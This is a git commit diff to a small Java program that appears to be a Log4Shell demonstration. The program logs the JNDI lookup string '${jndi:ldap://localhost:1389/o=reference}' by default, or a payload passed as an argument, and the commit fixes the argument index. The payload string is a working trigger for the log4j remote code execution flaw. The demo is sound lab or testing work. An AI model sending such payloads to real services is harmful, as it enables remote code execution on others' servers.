970840977d9e224fbdd8e0fa9c0e71f34eeed8d8
Elias Lundell <elilun03@gmail.com>
2024-03-11 14:54:05 +0100

    use args if provided - otherwise default jndi:ldap server

--- src/main/java/org/example/Main.java
+++ src/main/java/org/example/Main.java
@@ -5,11 +5,10 @@ import org.apache.logging.log4j.Logger;
 
 public class Main {
     public static void main(String[] args) {
-        System.out.println("Running main and logging a user controlled variable (e.g. HTTP Header)");
         Logger logger = LogManager.getLogger();
         String loggingStatement = "${jndi:ldap://localhost:1389/o=reference}";
         if (args.length >= 1) {
-            loggingStatement = args[1];
+            loggingStatement = args[0];
         }
 
         logger.error(loggingStatement);
